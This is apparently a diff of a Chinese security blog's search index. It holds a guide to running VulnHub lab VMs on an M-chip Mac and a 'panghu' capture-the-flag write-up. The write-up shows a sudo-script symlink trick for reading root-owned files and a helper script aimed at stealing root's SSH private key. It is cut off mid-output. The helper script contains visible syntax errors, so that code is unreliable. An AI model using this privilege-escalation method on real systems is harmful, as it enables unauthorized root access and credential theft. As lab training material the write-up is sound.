-  </entry>
-  <entry>
-    <title>mac环境靶场搭建</title>
-    <url>/posts/86.html</url>
-    <content><![CDATA[<p>Mac环境下靶场搭建</p>
-<span id="more"></span>
-<p>因为我是mac m芯片电脑，所以在安装靶场时候如果直接使用virtualbox会报错，这篇文章介绍了我安装靶场的解决方案</p>
-<h2 id="utm安装"><a href="#utm安装" class="headerlink" title="utm安装"></a>utm安装</h2><p>我使用的虚拟机是utm ，可以模拟x86系统，直接在官网免费下载<br><a href="https://mac.getutm.app/">https://mac.getutm.app/</a><br><img src="https://pic1.imgdb.cn/item/679a4c5cd0e0a243d4f87b67.png"></p>
-<h2 id="靶场安装包处理"><a href="#靶场安装包处理" class="headerlink" title="靶场安装包处理"></a>靶场安装包处理</h2><p>这里以从vulnhub下载的Deathnote为例<br>从靶场下来的安装包应该是.ovf<br>在终端用tar解压这个文件  解压得到两个文件 我们需要用的是.vmdk文件</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">(base) kakeru<span class="title">@bogon</span> downloads % tar xvf Deathnote.ova </span><br><span class="line"><span class="keyword">x</span> Deathnote.ovf</span><br><span class="line"><span class="keyword">x</span> Deathnote-disk<span class="number">001</span>.vmdk</span><br><span class="line"><span class="keyword">x</span> Deathnote.mf</span><br></pre></td></tr></table></figure></div>
-
-<p>然后下载qemu  mac用户可以用brew下载</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>qemu</span><br></pre></td></tr></table></figure></div>
-<p>然后在靶场解压后的目录中执行</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">qemu-<span class="selector-tag">img</span> convert -<span class="selector-tag">p</span>  -O qcow2 Deathnote-disk001<span class="selector-class">.vmdk</span> Deathnote<span class="selector-class">.qcow2</span> </span><br></pre></td></tr></table></figure></div>
-<p>执行后把.vmdk 文件转换成.qcow2文件</p>
-<h2 id="utm设置"><a href="#utm设置" class="headerlink" title="utm设置"></a>utm设置</h2><p>点击创建虚拟机 –&gt;  模拟  –&gt; 其他 进入虚拟机配置<br><img src="https://pic1.imgdb.cn/item/679a4c5ed0e0a243d4f87b68.png"><br>启动设备选择无<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b69.png"><br>修改内存  一般虚拟只要分配1g以下的内存<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b6a.png"><br>然后可以给虚拟机起个名字 点击存储<br><img src="https://pic1.imgdb.cn/item/679a4c60d0e0a243d4f87b6b.png"><br>接着右击虚拟机,点击编辑，进入虚拟机设置<br>1.在QEMU中取消UEFI启动<br><img src="https://pic1.imgdb.cn/item/679a4c98d0e0a243d4f87b6e.png"><br>2.网络选择桥接(你可以自己配置网络，桥接是最简单的)<br><img src="https://pic1.imgdb.cn/item/679a4c9ad0e0a243d4f87b6f.png"><br>3.右击IDE驱动器,删除<br><img src="https://pic1.imgdb.cn/item/679a4c9bd0e0a243d4f87b70.png"><br>4.驱动器新建点击导入 ，选择我们刚刚转换的.qcow2文件</p>
-<p>接着就可以启动虚拟机了<br>启动成功的画面:<br><img src="https://pic1.imgdb.cn/item/679a4de8d0e0a243d4f87ba6.png"></p>
-<h2 id="靶机没有分配到ip解决方案"><a href="#靶机没有分配到ip解决方案" class="headerlink" title="靶机没有分配到ip解决方案"></a>靶机没有分配到ip解决方案</h2><p>靶机启动后  nmap扫描当前网段发现主机ip 但是有的靶机没有分配到靶机<br>这是由于靶机中的使用的网卡和其配置文件中的网卡不匹配导致的</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">29</span> <span class="number">23</span>:<span class="number">50</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.0049</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.41</span> seconds</span><br></pre></td></tr></table></figure></div>
-<p>比如我这里这三个ip都不是靶机</p>
-<h3 id="debian系解决方案"><a href="#debian系解决方案" class="headerlink" title="debian系解决方案"></a>debian系解决方案</h3><p>这时 先关闭靶机 在启动的蓝色界面 按e进入命令行模式<br>（如果一直没有出现这个蓝色界面说明不是debian系的，在启动的时候按shift也能进入这个界面）<br>光标下移  找到ro（这里的倒数第三行） 改成rw single init&#x3D;&#x2F;bin&#x2F;bash<br>ctrl + x 进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679a51aad0e0a243d4f87be5.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be6.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be7.png"></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">ip <span class="keyword">a</span> <span class="comment">#查看实际使用网卡 (我这里就是enp0s1)</span></span><br></pre></td></tr></table></figure></div>
-<p><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be8.png"><br>然后输入 </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">nano /etc/network/interfaces <span class="punctuation">#</span><span class="params">(编辑网卡)</span></span><br></pre></td></tr></table></figure></div>
-<p>这里用nano 不用vim  vim不知道为什么在这个模式下面更改不了内容<br>然后把网卡替换成实际的网卡(enp0s3 改成 enp0s1)<br><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be9.png"><br><img src="https://pic1.imgdb.cn/item/679a5210d0e0a243d4f87bf1.png"><br>ctrl + o 保存 回车确定 最后ctrl + x 退出<br>重启网络服务</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service networking restart</span></span><br></pre></td></tr></table></figure></div>
-<p>等加载之后重启虚拟机  就发现可以扫到ip啦 (如果还是不行可以尝试把utm网络中桥接的端口从自动改成en0)<br><img src="https://pic1.imgdb.cn/item/679a5211d0e0a243d4f87bf2.png"></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">30</span> <span class="number">00</span>:<span class="number">07</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.035</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.135</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.17</span>s latency).</span><br><span class="line">MAC Address: B6:<span class="number">9</span>C:<span class="number">5</span>D:<span class="number">4</span>F:DE:AB (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts <span class="keyword">up</span>) scanned in <span class="number">3.69</span> seconds</span><br></pre></td></tr></table></figure></div>
-<h3 id="ubuntu系统"><a href="#ubuntu系统" class="headerlink" title="ubuntu系统"></a>ubuntu系统</h3><p>如果开机的时候一直加载进度进度条，没有出现蓝色界面，说明是ubuntu系统。<br>按shift进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679dd3ddd0e0a243d4f972dc.png"><br>然后按e，把ro改成 rw single init&#x3D;&#x2F;bin&#x2F;bash 并且把这行后面的都删除，直到initrd<br><img src="https://pic1.imgdb.cn/item/679dd50ed0e0a243d4f972f2.png"><br>ctrl + x开机<br>和dibian系一样用ip a查看真实ip端口<br>不一样的是这里网卡配置文件在</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line">/etc/netplan/<span class="number">00</span>-installer-config.yaml</span><br></pre></td></tr></table></figure></div>
-<p>修改成真实网卡（我这里3改成1）<br><img src="https://pic1.imgdb.cn/item/679dd746d0e0a243d4f97313.png"><br>ctrl + o 回车  ctrl + x 退出</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/netplan/00-installer-config.yaml </span><br></pre></td></tr></table></figure></div>
-<p>让修改后的文件生效</p>
-<p>然后重启靶机 就可以获取到靶机ip了</p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>靶场配置</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
-        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -2163,8 +2035,130 @@ root@flower:/#
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>HMV</tag>
         <tag>靶场</tag>
+        <tag>HMV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mac环境靶场搭建</title>
+    <url>/posts/86.html</url>
+    <content><![CDATA[<p>Mac环境下靶场搭建</p>
+<span id="more"></span>
+<p>因为我是mac m芯片电脑，所以在安装靶场时候如果直接使用virtualbox会报错，这篇文章介绍了我安装靶场的解决方案</p>
+<h2 id="utm安装"><a href="#utm安装" class="headerlink" title="utm安装"></a>utm安装</h2><p>我使用的虚拟机是utm ，可以模拟x86系统，直接在官网免费下载<br><a href="https://mac.getutm.app/">https://mac.getutm.app/</a><br><img src="https://pic1.imgdb.cn/item/679a4c5cd0e0a243d4f87b67.png"></p>
+<h2 id="靶场安装包处理"><a href="#靶场安装包处理" class="headerlink" title="靶场安装包处理"></a>靶场安装包处理</h2><p>这里以从vulnhub下载的Deathnote为例<br>从靶场下来的安装包应该是.ovf<br>在终端用tar解压这个文件  解压得到两个文件 我们需要用的是.vmdk文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">(base) kakeru<span class="title">@bogon</span> downloads % tar xvf Deathnote.ova </span><br><span class="line"><span class="keyword">x</span> Deathnote.ovf</span><br><span class="line"><span class="keyword">x</span> Deathnote-disk<span class="number">001</span>.vmdk</span><br><span class="line"><span class="keyword">x</span> Deathnote.mf</span><br></pre></td></tr></table></figure></div>
+
+<p>然后下载qemu  mac用户可以用brew下载</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>qemu</span><br></pre></td></tr></table></figure></div>
+<p>然后在靶场解压后的目录中执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">qemu-<span class="selector-tag">img</span> convert -<span class="selector-tag">p</span>  -O qcow2 Deathnote-disk001<span class="selector-class">.vmdk</span> Deathnote<span class="selector-class">.qcow2</span> </span><br></pre></td></tr></table></figure></div>
+<p>执行后把.vmdk 文件转换成.qcow2文件</p>
+<h2 id="utm设置"><a href="#utm设置" class="headerlink" title="utm设置"></a>utm设置</h2><p>点击创建虚拟机 –&gt;  模拟  –&gt; 其他 进入虚拟机配置<br><img src="https://pic1.imgdb.cn/item/679a4c5ed0e0a243d4f87b68.png"><br>启动设备选择无<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b69.png"><br>修改内存  一般虚拟只要分配1g以下的内存<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b6a.png"><br>然后可以给虚拟机起个名字 点击存储<br><img src="https://pic1.imgdb.cn/item/679a4c60d0e0a243d4f87b6b.png"><br>接着右击虚拟机,点击编辑，进入虚拟机设置<br>1.在QEMU中取消UEFI启动<br><img src="https://pic1.imgdb.cn/item/679a4c98d0e0a243d4f87b6e.png"><br>2.网络选择桥接(你可以自己配置网络，桥接是最简单的)<br><img src="https://pic1.imgdb.cn/item/679a4c9ad0e0a243d4f87b6f.png"><br>3.右击IDE驱动器,删除<br><img src="https://pic1.imgdb.cn/item/679a4c9bd0e0a243d4f87b70.png"><br>4.驱动器新建点击导入 ，选择我们刚刚转换的.qcow2文件</p>
+<p>接着就可以启动虚拟机了<br>启动成功的画面:<br><img src="https://pic1.imgdb.cn/item/679a4de8d0e0a243d4f87ba6.png"></p>
+<h2 id="靶机没有分配到ip解决方案"><a href="#靶机没有分配到ip解决方案" class="headerlink" title="靶机没有分配到ip解决方案"></a>靶机没有分配到ip解决方案</h2><p>靶机启动后  nmap扫描当前网段发现主机ip 但是有的靶机没有分配到靶机<br>这是由于靶机中的使用的网卡和其配置文件中的网卡不匹配导致的</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">29</span> <span class="number">23</span>:<span class="number">50</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.0049</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.41</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>比如我这里这三个ip都不是靶机</p>
+<h3 id="debian系解决方案"><a href="#debian系解决方案" class="headerlink" title="debian系解决方案"></a>debian系解决方案</h3><p>这时 先关闭靶机 在启动的蓝色界面 按e进入命令行模式<br>（如果一直没有出现这个蓝色界面说明不是debian系的，在启动的时候按shift也能进入这个界面）<br>光标下移  找到ro（这里的倒数第三行） 改成rw single init&#x3D;&#x2F;bin&#x2F;bash<br>ctrl + x 进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679a51aad0e0a243d4f87be5.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be6.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be7.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">ip <span class="keyword">a</span> <span class="comment">#查看实际使用网卡 (我这里就是enp0s1)</span></span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be8.png"><br>然后输入 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">nano /etc/network/interfaces <span class="punctuation">#</span><span class="params">(编辑网卡)</span></span><br></pre></td></tr></table></figure></div>
+<p>这里用nano 不用vim  vim不知道为什么在这个模式下面更改不了内容<br>然后把网卡替换成实际的网卡(enp0s3 改成 enp0s1)<br><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be9.png"><br><img src="https://pic1.imgdb.cn/item/679a5210d0e0a243d4f87bf1.png"><br>ctrl + o 保存 回车确定 最后ctrl + x 退出<br>重启网络服务</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service networking restart</span></span><br></pre></td></tr></table></figure></div>
+<p>等加载之后重启虚拟机  就发现可以扫到ip啦 (如果还是不行可以尝试把utm网络中桥接的端口从自动改成en0)<br><img src="https://pic1.imgdb.cn/item/679a5211d0e0a243d4f87bf2.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">30</span> <span class="number">00</span>:<span class="number">07</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.035</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.135</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.17</span>s latency).</span><br><span class="line">MAC Address: B6:<span class="number">9</span>C:<span class="number">5</span>D:<span class="number">4</span>F:DE:AB (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts <span class="keyword">up</span>) scanned in <span class="number">3.69</span> seconds</span><br></pre></td></tr></table></figure></div>
+<h3 id="ubuntu系统"><a href="#ubuntu系统" class="headerlink" title="ubuntu系统"></a>ubuntu系统</h3><p>如果开机的时候一直加载进度进度条，没有出现蓝色界面，说明是ubuntu系统。<br>按shift进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679dd3ddd0e0a243d4f972dc.png"><br>然后按e，把ro改成 rw single init&#x3D;&#x2F;bin&#x2F;bash 并且把这行后面的都删除，直到initrd<br><img src="https://pic1.imgdb.cn/item/679dd50ed0e0a243d4f972f2.png"><br>ctrl + x开机<br>和dibian系一样用ip a查看真实ip端口<br>不一样的是这里网卡配置文件在</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line">/etc/netplan/<span class="number">00</span>-installer-config.yaml</span><br></pre></td></tr></table></figure></div>
+<p>修改成真实网卡（我这里3改成1）<br><img src="https://pic1.imgdb.cn/item/679dd746d0e0a243d4f97313.png"><br>ctrl + o 回车  ctrl + x 退出</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/netplan/00-installer-config.yaml </span><br></pre></td></tr></table></figure></div>
+<p>让修改后的文件生效</p>
+<p>然后重启靶机 就可以获取到靶机ip了</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>靶场配置</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>panghu</title>
+    <url>/posts/59637.html</url>
+    <content><![CDATA[<p>panghu复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/67a1fe35d0e0a243d4fbcf9f.png"><br>这个是个简单的靶机，但是我有一个点没有想到，卡了很久，开了懦夫模式<br>登录入口是ssh&#x2F;panghu</p>
+<h1 id="第一阶段（读到-root-root-txt"><a href="#第一阶段（读到-root-root-txt" class="headerlink" title="第一阶段（读到&#x2F;root&#x2F;root.txt)"></a>第一阶段（读到&#x2F;root&#x2F;root.txt)</h1><p>有一个sudo权限的脚本</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jan:</span>/etc/ssh<span class="variable">$ </span>sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">ssh:</span> </span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> ssh on <span class="symbol">jan:</span></span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Runas</span> <span class="keyword">and</span> <span class="title class_">Command</span>-specific defaults <span class="keyword">for</span> <span class="symbol">ssh:</span></span><br><span class="line">    <span class="title class_">Defaults</span>!/usr/sbin/visudo env_keep+=<span class="string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> ssh may run the following commands on <span class="symbol">jan:</span></span><br><span class="line">    (root) <span class="symbol">PASSWD:</span> /opt/lzh.sh</span><br><span class="line"><span class="symbol">jan:</span>/etc/ssh<span class="variable">$ </span>cat /opt/lzh.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">cd /home/ssh</span><br><span class="line">cat backup/hi</span><br></pre></td></tr></table></figure></div>
+<p>内容是查看&#x2F;home&#x2F;ssh&#x2F;backup&#x2F;hi<br>现在的目标是如何利用这个脚本能读到&#x2F;root&#x2F;root.txt呢<br>没有修改hi的权限，对hi没有任何的权限<br>但是对backup这个目录有x操作权限，无法删除就把backup重命名<br>然后新建一个backup 然后用软链接就可以读到了<br>（我一直在hi这个文件里面想，其实啥都没有）</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sv /root/root.txt /home/ssh/backup/hi</span><br><span class="line"><span class="built_in">sudo</span> /opt/lzh.sh</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h1><p>通过第一阶段就可以知道，利用lzh.sh就可以读取任意文件内容<br>所以可以编写一个脚本，脚本内容来自群里的eviden</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span>[ -e <span class="string">&quot;backup&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">rm</span> -rf backup</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;removed&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">mkdir</span> -p backup</span><br><span class="line">source_file=<span class="variable">$1</span></span><br><span class="line"><span class="built_in">ln</span> -sn <span class="string">&quot;<span class="variable">$&#123;$source_file&#125;</span>&quot;</span> <span class="string">&quot;/home/ssh/backup/hi&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> /opt/lzh.sh</span><br></pre></td></tr></table></figure></div>
+<p>这样子就可以自动读取了<br>我们去读ssh的配置文件，思路是读取私钥然后登录root</p>
+<p>找到ssh私钥的地址 但是不是id_rsa是id_ed25519，而且这个目录在root目录下面，不是ssh目录，就觉得为什么有私钥还登录不上root，hhhhh</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">jan:~$ .<span class="regexp">/m.sh /</span>etc<span class="regexp">/ssh/</span>ssh_config</span><br><span class="line">removed</span><br><span class="line"><span class="string">&#x27;backup/hi&#x27;</span> -&gt; <span class="string">&#x27;/etc/ssh/ssh_config&#x27;</span></span><br><span class="line"><span class="comment">#	$OpenBSD: ssh_config,v 1.36 2023/08/02 23:04:38 djm Exp $</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is the ssh client system-wide configuration file.  See</span></span><br><span class="line"><span class="comment"># ssh_config(5) for more information.  This file provides defaults for</span></span><br><span class="line"><span class="comment"># users, and the values can be changed in per-user configuration files</span></span><br><span class="line"><span class="comment"># or on the command line.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configuration data is parsed as follows:</span></span><br><span class="line"><span class="comment">#  1. command line options</span></span><br><span class="line"><span class="comment">#  2. user-specific file</span></span><br><span class="line"><span class="comment">#  3. system-wide file</span></span><br><span class="line"><span class="comment"># Any configuration value is only changed the first time it is set.</span></span><br><span class="line"><span class="comment"># Thus, host-specific definitions should be at the beginning of the</span></span><br><span class="line"><span class="comment"># configuration file, and defaults at the end.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site-wide defaults for some commonly used options.  For a comprehensive</span></span><br><span class="line"><span class="comment"># list of available options, their meanings and defaults, please see the</span></span><br><span class="line"><span class="comment"># ssh_config(5) man page.</span></span><br><span 